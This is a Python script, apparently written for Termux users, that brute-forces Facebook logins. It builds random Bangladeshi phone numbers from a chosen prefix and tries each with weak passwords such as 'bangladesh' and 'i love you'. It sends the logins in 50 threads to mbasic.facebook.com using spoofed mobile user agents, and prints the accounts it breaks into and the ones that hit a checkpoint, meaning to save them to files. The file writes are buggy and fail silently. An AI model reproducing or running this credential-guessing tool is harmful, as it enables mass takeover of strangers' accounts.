#-----------------------script writen by Mr-Tan---------------------------
import requests, os, re, bs4,platform,sys,json,time,random,datetime,subprocess,threading,itertools,base64,uuid,zlib,string,mechanize
try:
    import requests
except:
    os.system("pip install requests")
try:
    import bs4
except:
    os.system("pip install bs4")
try:
    import rich
except:
    os.system("pip install rich")

from concurrent.futures import ThreadPoolExecutor as Tan
logo=f'''\x1b[38;5;48m
          _ ______ 
   ____ _(_) __/ /_
  / __ `/ / /_/ __/
 / /_/ / / __/ /_  
 \__, /_/_/  \__/  \x1b[1;93mfrom \x1b[38;5;208msister\x1b[38;5;48m Rikta \033[1;31mChowdhury\x1b[38;5;48m
/____/             
'''

loop = 0
oks = []
cps = [] 
ugen = []  
for x in range(10000):
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
def menu():
    os.system("clear")
    print(logo)
    print("\x1b[1;93m1\033[1;31m|\x1b[38;5;48m Random")
    print("\x1b[1;93m2\033[1;31m|\x1b[38;5;48m Admin")
    print("\x1b[1;93m0\033[1;31m|\x1b[38;5;48m Exit")
    choose=input("\033[1;31m×\x1b[38;5;208m put one \033[1;31m>\x1b[38;5;208m ")
    if choose in ["1"]:
        random_crack()
    elif choose in ["2"]:
        os.system('xdg-open https://www.facebook.com/abutanim.chowdury')
    elif choose in ["0"]:
        exit()
    else:
        print("Try again")
        menu()

def random_crack():
    user=[]
    os.system("clear")
    print(logo)
    print("\033[1;31mΔ\x1b[38;5;48m Example \033[1;31m:\x1b[38;5;48m 017, 018, 019, 016")
    code =input('\x1b[1;93m√\x1b[38;5;48m Choise \033[1;31m:\x1b[38;5;48m ')
    tanim = ''.join(random.choice(string.digits) for _ in range(2))
    rikta = ''.join(random.choice(string.digits) for _ in range(2))
    os.system("clear")
    print(logo)
    print("\033[1;31mΔ\x1b[38;5;48m Example \033[1;31m:\x1b[38;5;48m 10000, 20000, 30000")
    limit=int(input("\x1b[1;93m√ \x1b[38;5;48mchoose limit \033[1;31m:\x1b[38;5;48m "))
    for num in range(limit):
        like=''.join(random.choice(string.digits) for _ in range(4))
        user.append(like)
    with Tan(max_workers=50) as me:
        os.system("clear")
        count=str(len(user))
        print(logo)
        print(f"\033[1;31m∇\x1b[38;5;48m Sim   \033[1;31m:\x1b[38;5;48m {code}")
        print(f"\033[1;31mΔ\x1b[38;5;48m Limit \033[1;31m:\x1b[38;5;48m {count}")
        print('\033[1;37m━━━━━━━━━━━━━━━━━━━\x1b[38;5;48m')
        for guru in user:
            uid=code+tanim+rikta+guru
            pwx=[code+tanim+rikta+guru,rikta+guru,tanim+guru,code+tanim+rikta,'bangladesh','Bangladesh','bangla','Bangla','i love you']          
            me.submit(crack,uid,pwx,count)
            
def crack(uid,pwx,count):
    global loop
    global cps
    global oks
    global agent
    try:
        for key in pwx:
            session=requests.Session()
            love = random.choice(ugen)
            sys.stdout.write(f"\r\033[1;31m[\x1b[38;5;48m𝐅𝐈𝐍𝐃𝐈𝐍𝐆\033[1;31m]\033[1;37m-\033[1;31m[\x1b[38;5;48m%s\033[1;31m]\033[1;37m-\033[1;31m[\x1b[38;5;48mOK\033[1;31m:\x1b[38;5;48m%s\033[1;31m]\x1b[38;5;48m "%(loop,len(oks))),sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log={
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":key,
            "login":"Log In"}
            header= {'authority':'mbasic.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'dpr': '1',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
             'sec-ch-ua-full-version-list': '"Google Chrome";v="123.0.6312.60", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.60"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': love,}
            dca=session.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc",data=log,headers=header).text
            geta=session.cookies.get_dict().keys()
            if 'c_user' in geta:
                print(f"\r\033[1;31m[\x1b[38;5;48mTan-ok\033[1;31m]\x1b[38;5;48m {uid} \033[1;37m┼\x1b[38;5;48m {key}")
                open('\sdcard\Tan-oks.txt','a').write(+uid+' | '+key+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in geta:
                print(f"\r\033[1;31m[Tan-cp] {uid} ┼ {key}")
                open('\sdcard\Tan-cps.txt','a').write(+uid+' | '+key+'\n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1        
    except:
        pass

menu()
